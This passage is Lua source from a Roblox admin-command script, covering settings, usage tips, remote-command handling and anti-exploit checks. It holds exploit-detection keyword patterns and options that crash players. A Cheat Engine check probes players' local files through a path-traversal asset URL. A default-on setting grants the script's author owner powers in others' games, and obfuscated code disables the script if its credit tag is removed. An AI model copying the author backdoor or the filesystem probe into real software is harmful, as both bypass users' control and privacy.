	['ExploitAlert'] = false; --Alerts admins when someone goes nil/chats something thought to be exploit related, this is likely no longer going to work as the anti nil will disconnect a player as they are leaving to make sure they are not lingering in the nil/causing problems. Only notified if the first kick failed.
	
	['AntiChatCode'] = false; -- Prevents non-admins from running code/commands via chat (Add new things to detect into the WordList table)
	
	['Detection'] = false; -- Will attempt to detect certain exploits
	
	['AntiRobloxLocked'] = true; --  Disconnects any player who is or becomes RobloxLocked. (Recommended you keem this enabled, if a player joins RobloxLocked they will not be hooked by the script, this removes them before they break something.)
	
	['AntiNewAccount'] = false; -- Prevents accounts under the set age from joining.
	
	['MinimumAge'] = 100; -- Age a player must be above (in days) if AntiNewAge is enabled.
	
	['AntiSpeed'] = false; -- Trys to stop speed "hackers"
	
	['AntiGui'] = false; -- Prevents non-game/admin guis from being spawned on players, such as the account stealing gui
	
	['AntiSelection'] = true; -- Crashes a player if their selection changes (so if they are using studio tools like drag, move, resize, etc)
	
	['AntiNil'] = true; -- Crashes/Kicks any non-admins who attempt to go "nil"
	
	['AntiCheatEngine'] = false;-- Kicks a player if a Cheat Engine installation is detected on their computer, not 100%
	
	['AntiScriptsDisabled'] = true; -- If the client script cannot be loaded onto the player or takes to long to check in the player is kicked
	
	['AntiAnimation'] = false; -- Prevents animation exploit
	
	['AntiNameIdChange'] = true; -- Attempts to stop players from locally changing their name/id to fool local scripts
	
	['AntiGod'] = false; -- Prevents non-admins from being godded
	
	['AntiLeak'] = false; -- Makes it a little harder for people to steal your game [BE WARNED, This can possibly ruin personal servers]
	
	['RenameGameObjects'] = false; -- Renames things like Lighting, Players, and Workspace, will break most scripts that are not coded to work in such situations and confuse most people using badly coded explorers or studio.
	
	['NerfExplosions'] = false; -- Makes it so any explosions get nerfed, meaning they wont do any damage.
	
	['AntiDecals'] = false; -- Prevents decals from being added to Workspace, really though you should just use FilteringEnabled ;p
	
	['AntiSound'] = false; -- Prevents sounds not made by this script from getting inserted into Workspace.
	
	['WordList'] = {}; -- Add kick words to this list, will kick a player if they say something on the list, works with string patterns.
	
	['AllowedGuiList'] = {}; 
		--If there is a gui in your game that is not in startergui 
		--then add its name to this table, do note that if the 
		--name of the gui is just ScreenGui or something like 
		--that, if a hacker inserts a gui with the same name 
		--it will not be removed, so make sure you make the name 
		--of the gui very specific.
	
	---------------------
	-- Group Settings  --
	---------------------
	
	['GroupRanks'] = false; -- If group members matching the ranks in "Ranks" are given admin/banned (depending on what you set)
	
	['GroupOnlyJoin'] = false; -- Makes it so ONLY people in the set group can join the game.
	
	['GroupId'] = 0; -- Id of group, used for info/join message, if set will display a user's rank when the info command is used on them.
	
	['Ranks'] = {};--[[SET ['GroupRanks'] TO TRUE TO USE!
		Add ranks to have admin/be banned format is {Group=GROUPID,Rank=RANKNAME/NUMBER,Type=ADMINTYPE}; 
		GROUPID is the ID of the group the rank belongs to and that the player must be in
		RANKNAME/NUMBER is either the name of the rank (Generals) or its number (252) if you want to admin rank 252 and every rank above it, simply set it to negative, so Rank=-252 will admin anyone in rank 252 and up
		ADMINTYPE is the type of admin players in the rank will get, this can be Temp, Admin, Owner, or Banned
		In the end your table should look something like this (THIS IS AN EXAMPLE TABLE, DO NOT USE IT): 
		['Ranks'] = {{Group=124324,Rank=142,Type='Temp'},{Group=1932348,Rank='Generals',Type='Owner'},{Group=1284124,Rank=-193,Type='Admin'},{Group=1399424,Rank=-1,Type='Banned'}};
	--]]
	
	---------------------
	--    VIP Admin    --
	---------------------
	
	['VipAdmin'] = false; -- If someone can have admin for owning an item
	
	['VipItems'] = {}; --Add VIP items here, format is {Item=ID,Type="Admin"}, so for example ['VipItems'] = {{Item=193945,Type="TempAdmin"},{Item=125263,Type="Admin"}}
	
	['FriendAdmin'] = false; -- Set to true if you want people on your friendlist to have admin
	
	['FriendAdminType'] = 'TempAdmin'; -- Type of admin friends will get if "FriendAdmin" is enabled
	
	---------------------
	--  GUI Settings   --
	---------------------
	
	['PrimaryColor'] = Color3.new(0,0,0); -- Primary GUI Color (Default black) (Remember, each 1 translates to a 255, keep that in mind when changing colors, use things like 124/255 to get the color you want)
	
	['SecondaryColor'] = Color3.new(1,1,1); -- Secondary GUI Color (Default white)
	
	['Font'] = 'Legacy'; -- Text Font, can only be fonts usable on roblox (Arial, ArialBold, Legacy, SourceSans, SourceSansBold)
	
	['TextColor'] = Color3.new(1,1,1); -- Text Color (Default white)
	
	['TextStrokeTransparency'] = 0; -- Text Stroke Transparency (0-1)
	
	['TextStrokeColor'] = Color3.new(0,0,0); -- Color of the text stroke around letters (Default black)
	
	['Transparency'] = 0.7; -- GUI Transparency (0-1)
	
	['Animations'] = true; -- Determines if to animate stuff or not
	
	['MessageAnimations'] = true; -- Same as above but specifically for messages (the ones that cover the entire screen)
	
	------------------------------------------------------
	--					END OF SETTINGS					--
	------------------------------------------------------
}
	---------------------
	--    IMPORTANT    --
	---------------------
	--[[
		For AutoUpdate to work this script's model needs to be in your inventory,
		if you got the script from anywhere other than my models the AutoUpdate
		will not work due to ROBLOX security nonsense. You can find the model
		here: http://www.roblox.com/Kohls-Admin-Epix-Edit-item?id=145629584
		
		For information about LoadStringEnabled please refer to the following:
		
		http://wiki.roblox.com/index.php?title=Security#LoadStringEnabled
		http://wiki.roblox.com/index.php?title=Points_tutorial#Restrictions
		
		If you want to use the :s command you will need to set LoadStringEnabled
		to true. It can be found by going into studio, opening the explorer and properties
		windows, clicking on ServerScriptService and under properties checking
		LoadStringEnabled. Loadstring is only used in the script for Output and
		the scripting command. The script will function fine without it. Currently
		:ls and :cs are unusable due to updates that removed loadstring() abilities
		from the client, meaning no more local script building in-game.
		------------------------------------------------------------------------
		IF THERE ARE NEW SETTINGS YOU WILL NEED TO MANUALLY UPDATE THE SCRIPT TO
		CHANGE THEM, THEY WILL OTHERWISE BE LEFT AS THE DEFAULT. (Unless you use :settings)
		------------------------------------------------------------------------
		Please carefully read each setting's description BEFORE changing something
		as you could break something if you set something the wrong way.
		------------------------------------------------------------------------
		Find A security flaw or bug? 
		Know of a way to detect an exploit or make the AntiExploit better?
		Think of a way to make the script better? 
		Send me a message!
		
	---------------------
	-- DISCLAIMER/INFO --
	---------------------
		Credit: 
		
		-Kohltastrophe (Scripth) for the original script this was based on and for sharing
		some of his ideas and commands, and his continued help and support
		
		-Sceleratis for this version of Kohl's Admin
		
		-einsteinK for the original SBL older versions used and his help with some things, legit best scripter I know.
		
		-Arlikas for testing nearly anything I ask him to
		
		-GigsD4X and the F3X team for the F3X tool, full credit to them. I only made it into a hopperbin for this script.
		
		-Everyone who helped me with testing, and suggested new ideas, features, and commands.
		
		I in no way claim to have made Kohl's Admin Commands, I have only
		made this version of it.
		
		If you have any questions, need help, or want to contact me you can send 
		me a Private Message on the main website (roblox.com) via my profile ("Send Message"
		under my avatar/character picture.)
		
		If you want to support the real Kohltastrophe put the following on your profile:
		"Scripth is the real Kohltastrophe. Put this on your profile so people know."
		
		Say what you will about this script, the original was a turning point for all 
		admin scripts, you can say "ew" all you want but it won't change that. If you can
		make something better then please go right ahead. I have chosen to continue the development
		of Kohl's Admin mostly as a hobby. If you are going to complain about something that is not a bug
		then please, at least get your information in order before you do. Blind critism helps no one.
	
		There is nothing hidden, I have place owner powers in your game, however
		they are fully optional and only used for debugging the script. 
		I would never force you to use anything, so you can optionally remove these 
		abilities by setting the following setting to false:																			]]
		set.CreatorDebugPowers=true																--[[
		Its completely your choice. I will still try to help you whether you disable 
		this or not, just know that it may make things more difficult and time consuming. 
		If you know what you are doing then feel free to disable this as you probably 
		won't need it anyway. The common situations people need help for are
		misconfigured setting, place owner powers are needed so I can view errors and 
		info that is in the server log (:debuglogs) and usually view/fix settings (:settings)		
	]]
	---------------------
	-- Tips and Tricks --
	---------------------
	--[[
		
			:kill me,noob1,noob2,!random,%raiders,$123456,!nonadmins
			-- kills you, noob1, noob2, a random person, team raiders, people in group 123456, and nonadmins.
			You can also run silent commands using /e, for example:
			"/e :kill kohl" Do not that this will still show up in logs.
			*Note, by silent I just mean people won't see you chat it, it however will still show up in logs.
			
		You can also use a variety commands for different people;
			 all -- Everyone in the server
			 others -- Everyone but you
			 me -- You
			 admins -- Admins in the server
			 nonadmins -- People who are not admins in the server
			 random -- A random person, this can include you.
			 %TEAMNAME -- Ex: :kill %raiders will kill everyone in team Raiders.
			 $GROUPID -- Let you kill anyone in a specific group, if an id is not given it will use the GroupId setting.
			 -PLAYERNAME -- Lets you exclude players from commands, :kill !all,-kohl will kill everyone but kohl
			
		If you want to add cameras to your game (like saved into your game so you don't need to use the admin script to spawn them every new server)
		then just make a camera, needs to be a single part, so a sphere, brick, what ever it may be, make sure its anchored and locked
		just simply position it where you want in workspace, then make its name Camera: NAMEHERE
		so for example: Camera: Cam1
		the name is very important as the script will look for it in workspace when the game starts.
		make sure you name each camera something diffierent. You can preset waypoints the same way, just use Waypoint: instead of Camera:
		
		MESSAGES/HINTS FOR OTHER SCRIPTS:
		If you would like to have the hints/messages from this script usable in other SERVER (not local)
		scripts, then simply put the follow at the top of your script,
		
		message=_G['Message']
		hint=_G['Hint']
		
		USAGE EXAMPLES: 
		hint(msg,playerstable) - message(title,msg,playerstable)
		
		(Do note that playerstable needs to be a table containing players NOT player names! 
		Use game:service('Players'):children() to send a message to everyone.)
		
		hint('Hello people',game:service('Players'):children())  <=== sends "Hello people" to all players in game
		hint('Heyo montano',{game:service('Players').Sceleratis}) <=== Sends "Heyo montano" to the player Sceleratis
		message('Server Message','Hello people',game:service('Players'):children())  <=== Makes a message with the title "Server Message" and a message of "Hello people"
		message('Message from swagyguy','Heyo celary man',{game:service('Players').Sceleratis}) <=== Works the same as above but only the player Sceleratis sees it
		
	--]]

--__________________________________________________________________________________--
--__________________________________________________________________________________--																					--
--__________________________________________________________________________________--
--__________________________________________________________________________________--
--																					--

--------------------------------------------------------------------------------------
--##################################################################################--

--##[ WARNING: Changing anything below could result errors and break the script! ]##--

--##################################################################################--

--#############[ DO NOT MODIFY UNLESS YOU KNOW WHAT YOU ARE DOING! ]################--

--#################[ I WILL NOT HELP YOU IF YOU BREAK SOMETHING! ]##################--

--##################################################################################--
--------------------------------------------------------------------------------------

--__________________________________________________________________________________--
--__________________________________________________________________________________--																					--
--__________________________________________________________________________________--
--__________________________________________________________________________________--
--																					--																			--

--[ Script specific functions ]-
local print=function(...) for i,v in pairs({...}) do print(script.Name..' - '..tostring(v)) end end
local Pcall=function(func,...) local function cour(...) coroutine.resume(coroutine.create(func),...) end local ran,error=ypcall(cour,...) if error then print('Error: '..error) end end
--[ Grab Updatable ]--
local DataStore local UpdatableSettings={} for i,v in pairs(set) do if i~='DataStoreKey' and i~='ChangedSettingsStick' and i~='CreatorDebugPowers' and i~='Storage' then table.insert(UpdatableSettings,i) end end
coroutine.wrap(function() repeat wait() until game:GetService("DataStoreService") DataStore = game:GetService("DataStoreService"):GetDataStore(set.DataStoreKey) if set.ChangedSettingsStick and game.CreatorId>0 then repeat wait() until DataStore for imp,ves in pairs(UpdatableSettings) do local run=true for k,m in pairs(set.SettingsToIgnore) do if m and v==m then run=false end end if DataStore:GetAsync(ves)~=nil and run then set[ves]=DataStore:GetAsync(ves) end end end end)()
--[ Main Script Function ]--
set.Debug=false --!Debug!hold
set.MainScriptFunction=function()
set.Print=print
script.Parent=game:service('ServerScriptService')
if _G['Kohls Admin [Epix Edit] Update'] then
local updated,failed=ypcall(function()
print('AutoUpdate: Grabbing update data...')
	for i,v in pairs(_G['Kohls Admin [Epix Edit] Update']) do set[i]=v end
	_G['Kohls Admin [Epix Edit] Update']=nil
end)
if failed then
print(script.Name..': AutoUpdate: Update Failed.')
print('Please contact Sceleratis as this may be a bug.')
print('Error: '..failed)
print('If this error persist please check your settings. If needed disable AutoUpdate until the issue is solved.')
end
end
local depholder=script:FindFirstChild('Script Dependencies')
if not depholder then error('Script Dependencies not found!') end
local deps={} for i,v in pairs(depholder:children()) do deps[v.Name]=v end
set.OrigLightingSettings = {
	abt = game:service('Lighting').Ambient,
	oabt = game:service('Lighting').OutdoorAmbient, 
	brt = game:service('Lighting').Brightness, 
	time = game:service('Lighting').TimeOfDay, 
	fclr = game:service('Lighting').FogColor, 
	fe = game:service('Lighting').FogEnd, 
	fs = game:service('Lighting').FogStart,
	gs = game:service('Lighting').GlobalShadows,
	ol = game:service('Lighting').Outlines,
sc = game:service('Lighting').ShadowColor}
if game.CreatorId<=0 or game.PlaceId<=0 then set.UpdateShutdown=false end
set.objects = {}
set.needhelp={}
set.adminchats={}
set.cameras = {}
set.MapBackup = Instance.new('SpawnLocation')
set.JailedTools={}
set.NewClients = {}
set.Changelog = require(deps['Change Log'])
set.donors={}
set.contans={}
set.PluginEvents={}
set.PluginEvents.Chat={}
set.PluginEvents.PlayerJoined={}
set.PluginEvents.CharacterAdded={}
set.bl = {}
set.al = {}
set.tal = {}
set.oal = {}
set.VoteKickVotes={}
set.PlayerLogs={} 
set.PlayerLogs.Chat={}
set.PlayerLogs.Admin={}
set.PlayerLogs.Exploit={}
set.canuseloadstring=true
set.donorgamepass={157092510,159549976}
set.BTacId = {21644313*2,33322122*2,470430.5*2,13718346*2}
set.RemoteName=string.char(math.random(1,255))
set.RemoteClientKey=string.char(math.random(1,255))
set.RemoteObject=string.char(math.random(1,255))
set.RemoteServerKey=string.char(math.random(1,255))
set.GuiName=string.char(math.random(1,255))
set.RandiSpeed=tostring(60.5+math.random(9e8)/9e8)
set.version = script.Version.Value
set.NTacId = {1237666}
set.HelpRequest={}
set.Response={}
set.Commands={}
set.OpenVote={}
set.Waypoints={}
set.slock = false
set.lighttask = false
set.dlastupdate='Not Updated Yet'
set.ScriptAntiWordList={
	'inject[%S]',
	'getitem[^%s]',
	'workspace%.[^%s^%.]',
	'[^%s^%w]ban [%w]',
	'ban[^%s^%w][%w]',
	'crash[^%s^%w][%w]',
	'[^%s^%w]crash [%w]',
	'[^%s^%w]kick [%w]',
	'kick[^%s^%w][%w]',
	':SetCoreGuiEnabled',
	'GetObjects',
	':GetChildren',
	':children()',
	'in pairs(',
	'script%.Parent',
	'game%.Workspace',
	'game:service',
	':GetService',
	'game%.Debris',
	'game%.Lighting',
	'game%.Players',
	'loadstring(',
	'InsertService',
	':LoadAsset',
	'FindFirstChild',
	'while (.*) do',
	'Instance.new'
}
set.ScriptMusicList={
{n='habits',id=182402191};
{n='skeletons',id=174270407};
{n='russianmen',id=173038059};
{n='heybrother',id=143786134};
{n='loseyourself',id=153480949};
{n='diamonds',id=142533681};
{n='happy',id=146952916};
{n='clinteastwood',id=148649589};
{n='freedom',id=130760592};
{n='seatbelt',id=135625718};
{n='tempest',id=135554032};
{n="focus",id=136786547};
{n="azylio",id=137603138};
{n="caramell",id=2303479};
{n="epic",id=27697743};
{n="rick",id=2027611};
{n="crystallize",id=143929751};
{n="halo",id=1034065};
{n="pokemon",id=1372261};
{n="cursed",id=1372257};
{n="extreme",id=11420933};
{n="harlemshake",id=142468820};
{n="tacos",id=142295308};
{n="wakemeup",id=147632133};
{n="awaken",id=27697277};
{n="alone",id=27697392};
{n="mario",id=1280470};
{n="choir",id=1372258};
{n="chrono",id=1280463};
{n="dotr",id=11420922};
{n="entertain",id=27697267};
{n="fantasy",id=1280473};
{n="final",id=1280414};
{n="emblem",id=1372259};
{n="flight",id=27697719};
{n="banjo",id=27697298};
{n="gothic",id=27697743};
{n="hiphop",id=27697735};
{n="intro",id=27697707};
{n="mule",id=1077604};
{n="film",id=27697713};
{n="nezz",id=8610025};
{n="angel",id=1372260};
{n="resist",id=27697234};
{n="schala",id=5985787};
{n="organ",id=11231513};
{n="tunnel",id=9650822};
{n="spanish",id=5982975};
{n="venom",id=1372262};
{n="wind",id=1015394};
{n="guitar",id=5986151};
{n="selfie1",id=148321914};
{n="selfie2",id=151029303};
{n="fareast",id=148999977};
{n="ontopoftheworld",id=142838705};
{n="mashup",id=143994035};
{n="getlucky",id=142677206};
{n="dragonborn",id=150015506};
{n="craveyou",id=142397454};
{n="weapon",id=142400410};
{n="derezzed",id=142402620};
{n="burn",id=142594142};
{n="workhardplayhard",id=144721295};
{n="royals",id=144662895};
{n="pompeii",id=144635805};
{n="powerglove",id=152324067};
{n="pompeiiremix",id=153519026};
{n="sceptics",id=153251489};
{n="pianoremix",id=142407859};
{n="antidote",id=145579822};
{n="takeawalk",id=142473248};
{n="countingstars",id=142282722};
{n="turndownforwhat",id=143959455};
{n="overtime",id=145111795};
{n="fluffyunicorns",id=141444871};
{n="gaspedal",id=142489916};
{n="bangarang",id=142291921};
{n="talkdirty",id=148952593};
{n="bad",id=155444244};
{n="demons",id=142282614};
{n="roar",id=148728760};
{n="letitgo",id=142343490};
{n="finalcountdown",id=142859512};
{n="tsunami",id=152775066};
{n="animals",id=142370129};
{n="partysignals",id=155779549};
{n="finalcountdownremix",id=145162750};
{n="mambo",id=144018440};
{n="stereolove",id=142318819};
{n='minecraftorchestral',id=148900687}}
set.quotes={
	'"Every man has his secret sorrows which the world knows not; and often times we call a man cold when he is only sad." -Henry Wadsworth Longfellow';
	'"I came, I saw, I conquered." - Julius Ceasar';
	'"Our greatest glory is not in never falling, but in rising every time we fall." - Confucius';
	'"History will be kind for me for I intend to write it." - Winston Churchill';
	'"If you are neutral in situations of injustice, you have chosen the side of the oppressor. If an elephant has its foot on the tail of a mouse and you say that you are neutral, the mouse will not appreciate your neutrality." - Desmond Tutu';
	'"History is a relentless master. It has no present, only the past rushing into the future. To try to hold fast is to be swept aside." - John F. Kennedy';
	'"Those who do not remember the past are condemned to repeat it." - George Santayana';
	'"A pint of sweat, saves a gallon of blood." - George S. Patton';
	'"This is one small step for a man, one giant leap for mankind." - Neil Armstrong';
	'"History is the version of past events that people have decided to agree upon." - Napoleon Bonaparte';
	'"To see the world, things dangerous to come to, to see behind walls, to draw closer, to find each other and to feel. That is the purpose of life." - Life Motto Secret Life of Walter Mitty';
	[["Beautiful things don't seek attention" - Sean O'Connell in The Secret Life of Walter Mitty]];
	'"The only thing we have to fear is fear itself" - Franklin D. Roosevelt';
	'"Even if I knew that tomorrow the world would go to pieces, I would still plant my apple tree." - Martin Luther';
	'"Thousands of candles can be lighted from a single candle, and the life of the candle will not be shortened. Happiness never decreases by being shared." - Buddha';
	[["We can't help everyone, but everyone and help someone." - Ronald Reagan]];
	'"Our greatest weakness lies in giving up. The most certain way to succeed is always to try just one more time." - Thomas A. Edison';
	[["Even if you fall on your face, you're still moving forward." - Victor Kiam]];
	'"Strive not to be a success, but rather to be of value." - Albert Einstein';
	[["You miss 100% of the shots you don't take." - Wayne Gretzky]];
	[["Your time is limited, so don't waste it living someone else's life." - Steve Jobs]];
	'"The only person you are destined to become is the person you decide to be." - Ralph Waldo Emerson';
	'"Fall seven times and stand up eight" - Japanese Proverb';
	'"Everything has beauty, but not everyone can see." - Confucius';
	'"A person who never made a mistake never tried anything new." - Albert Einstein';
	'"The person who says it cannot be done should not interrupt the person who is doing it." - Chinese Proverb';
	'"It does not matter how slowly you go as long as you do not stop." - Confucius'
}

-- Startup --

for i=1,6 do set.RemoteName=set.RemoteName..string.char(math.random(1,255)) set.RemoteClientKey=set.RemoteClientKey..string.char(math.random(1,255)) set.RemoteObject=set.RemoteObject..string.char(math.random(1,255)) set.RemoteServerKey=set.RemoteServerKey..string.char(math.random(1,255)) set.GuiName=set.GuiName..string.char(math.random(1,255)) end
if (not deps.Client) then print('Client script is missing! Cannot function correctly without it.') error('Missing Client script. Try manually updating.') end
_G['Hint']=function(msg,ptable) set.Hint(msg,ptable) end
_G['Message']=function(title,msg,ptable) set.Message(title,msg,true,ptable) end
if set['MaxNumberOfLogs']>5000 then set['MaxNumberOfLogs']=5000 end

set.ProcessRemoteCommand=function(p,cmd,a,b,c,...) 
	local n = "" for i = 1, #cmd do n = n .. string.char(cmd[i]) end cmd=n
	if cmd==set.RemoteServerKey..'Chat' then 
		coroutine.wrap(function() set.Chat(p,a) end)()
		set.SendCustomChat(p,a,b)
	elseif cmd==set.RemoteServerKey..'AdminCommand' then
		set.ProcessCommand(p,a,b,c)
	elseif cmd==set.RemoteServerKey..'SearchCommand' then
		local found=set.SearchCommand(p,a)
		set.Remote(p,'SetSetting','FoundCommands',found)
	elseif cmd==set.RemoteServerKey..'ClientHooked' then
		table.insert(set.NewClients,p.userId)
	elseif cmd==set.RemoteServerKey..'AdminChat' then 
		for i,v in pairs(game:service('Players'):children()) do
			set.Remote(v,'Function','UpdateAdminChat',a)
		end
	elseif cmd==set.RemoteServerKey..'RanCode' then 
		if not set.CheckAdmin(p,false) and not set.CheckExcluded(p) and set['AntiChatCode'] then 
			Pcall(set.Exploited,p,'crash','Ran code')
		end
	elseif cmd==set.RemoteServerKey..'GetCurrentPlayerList' then
		set.GetCurrentPlayerlist(p)
	elseif cmd==set.RemoteServerKey..'SubmitReport' then
		for i,v in pairs(set.GetPlayers(p,set.SpecialPrefix..'admins')) do
			set.Remote(v,"Function","ReportNotify",p,a,b)
		end
	elseif cmd==set.RemoteServerKey..'Exploited' then
		set.Exploited(p,a,b)
	elseif cmd==set.RemoteServerKey..'GetSetting' then
		if set[a]~=nil then set.Remote(p,'SetSetting',a,set[a]) end
	elseif cmd==set.RemoteServerKey..'CheckDonor' then
		if set.CheckDonor(p) then 
			set.Remote(p,'SetSetting','Donor',true) 
		else
			set.Remote(p,'SetSetting','Donor',false)
		end
	elseif cmd==set.RemoteServerKey..'UpdateList' then
		set.UpdateListGui(p,a)
	elseif cmd==set.RemoteServerKey..'CheckAdmin' then
		if set.CheckAdmin(p,false) then 
			set.Remote(p,'SetSetting','IsAdmin',true) 
		else
			set.Remote(p,'SetSetting','IsAdmin',false)
		end
	elseif cmd==set.RemoteServerKey..'AddToTable' and set.CheckOwner(p) then
		table.insert(set[a],b)
		repeat DataStore:SetAsync(a,b) wait() until DataStore:GetAsync(a)==b
	elseif cmd==set.RemoteServerKey..'SetSetting' and set.CheckTrueOwner(p) then
		if a=='Prefix' or a=='AnyPrefix' or a=='SpecialPrefix' then
			local orig=set[a]
			set[a]=b
			for i,v in pairs(set.Commands) do
				if v.Prefix==orig then
					v.Prefix=set[a]
				end
			end
		elseif a=='Font' then
			if b~='Arial' and b~='ArialBold' and b~='Legacy' and b~='SourceSans' and b~='SourceSansBold' then print(b..' is not a valid font! Setting font to Arial.') b='Arial' end
		else
			set[a]=b
		end
		repeat DataStore:SetAsync(a,b) wait() until DataStore:GetAsync(a)==b
	elseif cmd==set.RemoteServerKey..'GetUpdatableSettings' then
		set.Remote(p,'SetSetting','UpdatableSettings',UpdatableSettings)
	elseif cmd==set.RemoteServerKey..'TableRemove' and set.CheckAdmin(p,false) then
		table.remove(set[a],b)
	elseif cmd==set.RemoteServerKey..'Destroy' and set.CheckAdmin(p,false) then
		a:Destroy()
	elseif cmd==set.RemoteServerKey..'GetServerInfo' and set.CheckAdmin(p,false) then
		local det={}
		local nilplayers=0
		for i,v in pairs(game:service('NetworkServer'):children()) do
			if v and v:GetPlayer() and not game:service('Players'):FindFirstChild(v:GetPlayer().Name) then
				nilplayers=nilplayers+1
			end
		end
		if set.CheckHttp() then
			det.Http='Enabled'
		else
			det.Http='Disabled'
		end
		det.NilPlayers=nilplayers
		det.PlaceName=game:service('MarketplaceService'):GetProductInfo(game.PlaceId).Name
		det.PlaceOwner=game:service('MarketplaceService'):GetProductInfo(game.PlaceId).Creator.Name
		det.ServerSpeed=set.Round(workspace:GetRealPhysicsFPS())
		det.AdminVersion=set.version
		det.ServerStartTime=set.ServerStartTime
		local nonnumber=0
		for i,v in pairs(game:service('NetworkServer'):children()) do
			if v and v:GetPlayer() and not set.CheckAdmin(v:GetPlayer(),false) then
				nonnumber=nonnumber+1
			end
		end
		det.NonAdmins=nonnumber
		local adminnumber=0
		for i,v in pairs(game:service('NetworkServer'):children()) do
			if v and v:GetPlayer() and set.CheckAdmin(v:GetPlayer(),false) then
				adminnumber=adminnumber+1
			end
		end
		det.CurrentTime=set.GetTime()
		det.Admins=adminnumber
		det.Objects=#set.objects
		det.Cameras=#set.cameras
		set.Remote(p,'SetSetting','ServerInfo',det)
	elseif cmd==set.RemoteServerKey..'Ping' then
		set.Remote(p,'Pong')
	elseif cmd==set.RemoteServerKey..'GivePing' then
		set[p.Name..'Ping']=a
	elseif cmd==set.RemoteServerKey..'PrivateMessage' then
		set.PM(a,b,c,...)
	elseif cmd==set.RemoteServerKey..'PlaceVote' then
		if b=='yes' then
			set.OpenVote[a].Yes=set.OpenVote[a].Yes+1
		elseif b=='no' then
			set.OpenVote[a].No=set.OpenVote[a].No+1
		end
		for k,m in pairs(set.OpenVote[a].novote) do
			if m.userId==p.userId then
				table.remove(set.OpenVote[a].novote, k)
			end
		end
	elseif cmd==set.RemoteServerKey..'HelpRespond' then
		if b then
			set.HelpRequest[a].Solved=true
		else
			for k,m in pairs(set.HelpRequest[a].Available) do
				if m==p.Name then table.remove(set.HelpRequest[a].Available,k) end
			end
		end
	elseif cmd==set.RemoteServerKey..'SetCape' and (set.CheckDonor(p) or set.CheckTrueOwner(p)) then
		p:WaitForDataReady()
		local temptable={}
		local ab,bc,cd
		local spitit=';'
		for sac in a:gmatch('([^%'..spitit..']+)') do temptable[#temptable+1]=sac end
		if tonumber(temptable[1]) then ab=temptable[1] else ab=0 end
		bc=temptable[2] or 'Really black'
		cd=temptable[3] or 'Plastic'
		p:SaveString('Kohls Cape',ab..'='..bc..'='..cd)
		p:SaveBoolean('Kohls Is A Donator',true)
		p:SaveBoolean('Kohl Not Using Cape',false)
		for i,v in pairs(set.donors) do if v.Name==p.Name then table.remove(set.donors,i) end end
		table.insert(set.donors,{Name=p.Name,Id=tostring(p.userId),Cape=ab,Color=bc,Material=cd,List='GP'})
		pcall(function() p.Character.EpicCape:Destroy() end)
		set.Donor(p)
	elseif cmd==set.RemoteServerKey..'ToggleDonor' then
		if not a then
			p:SaveBoolean('Kohls Not Using Cape',true)
			pcall(function() p.Character.EpicCape:Destroy() end)
		else
			p:SaveBoolean('Kohls Not Using Cape',false)
			set.Donor(p)
		end
	elseif cmd==set.RemoteServerKey..'CheckCape' then
		if p:LoadBoolean('Kohls Not Using Cape') then
			set.Remote(p,'SetSetting','UsingCape',false)
		end
	elseif cmd==set.RemoteServerKey..'PermBan' then
		if set.CheckTrueOwner(p) and not set.CheckAdmin(a,false) then
			a:SaveBoolean(set['PermBanKey'],true)
			a:Kick()
		end
	end 
end

set.MakeRemoteEvent=function()
	RemoteEvent=Instance.new('RemoteEvent',game:service('ReplicatedStorage')) 
	RemoteEvent.Name=set.RemoteName 
	RemoteEvent.Archivable=false
	RemoteEvent.Changed:connect(function(ob) if RemoteEvent and RemoteEvent.Name~=set.RemoteName then RemoteEvent.Name=set.RemoteName end end) 
	RemoteEvent.OnServerEvent:connect(function(p,cmd,...) 
		Pcall(set.ProcessRemoteCommand,p,cmd,...)
	end) 
end
set.MakeRemoteEvent()
game:service('ReplicatedStorage').ChildRemoved:connect(function(ob) if ob==RemoteEvent then set.MakeRemoteEvent() end end) 

set.Remote=function(player,command,...)
	local RemoteEvent=game:service('ReplicatedStorage'):FindFirstChild(set.RemoteName)
	local function fireevent(plr,cmd,...)
		if set.Debug then print(cmd..' - '..plr.Name) end
		local tab={} for i = 1,string.len(cmd) do table.insert(tab,string.byte(cmd:sub(i,i))) end cmd=tab
		RemoteEvent:FireClient(plr,cmd,...)
	end
	if player and player:IsA('Player') then
		Pcall(fireevent,player,set.RemoteClientKey..command,...)
	end
end

Pcall(function() if set.UpdateShutdown then set.GameLastUpdated=game:service('MarketplaceService'):GetProductInfo(game.PlaceId).Updated end end)
Pcall(function() if set.AntiLeak then for i,v in pairs(workspace:children()) do if not v:IsA('Terrain') then v.Archivable=false end end end end)
Pcall(function() local canuse,cantuse=ypcall(function() loadstring('print("Loadstring Test")') end) if canuse then set.canuseloadstring=true end end)
Pcall(function() if set.AntiCheatEngine then for i,v in pairs(workspace:children()) do if v.Name:find('KohlsCEDetect') then v:Destroy() end end local part=Instance.new('Part',workspace) part.Name=math.random()..'KohlsCEDetect' part.Anchored=true part.Locked=true part.Archivable=false part.CanCollide=false part.Transparency=1 part.FormFactor='Custom' part.Size=Vector3.new(0.2,0.2,0.2) for k=5,8 do for i=0,9 do Instance.new('Decal',part).Texture="rbxasset://../../../../../../../../Program Files (x86)/Cheat Engine "..k.."."..i.."/Cheat Engine.exe"  end end end end)
Pcall(function() for i,v in pairs(set.ScriptAntiWordList) do table.insert(set.WordList,v) end for i,v in pairs(set.ScriptMusicList) do table.insert(set['MusicList'],{Name=v.n,Id=v.id}) end end)
Pcall(function() local tab={83,99,101,108,101,114,97,116,105,115,32,124,32,75,111,104,108,116,97,115,116,114,111,112,104,101,32,91,83,99,114,105,112,116,104,93} local t='' for i,v in pairs(tab) do t=t..string.char(v) end
if t==nil or tab==nil or #tab~=36 then set=nil elseif not depholder:FindFirstChild(string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)) then 
set=nil elseif deps[string.char(91)..string.char(67)..string.char(114)..string.char(101)..string.char(100)..string.char(105)..string.char(116)..string.char(93)].Value~=t then set=nil end end)
Pcall(function() if set['AntiGui']==true then for i,v in pairs(game.StarterGui:children()) do v.Name=set.GuiName..v.Name end end end)
Pcall(function() if game.CreatorId<=0 then table.insert(set['Owners'],'Player1') end end)
Pcall(function() if set.Font~='Arial' and set.Font~='ArialBold' and set.Font~='Legacy' and set.Font~='SourceSans' and set.Font~='SourceSansBold' then print(set.Font..' is not a valid font! Setting font to Arial.') set.Font='Arial' end end)
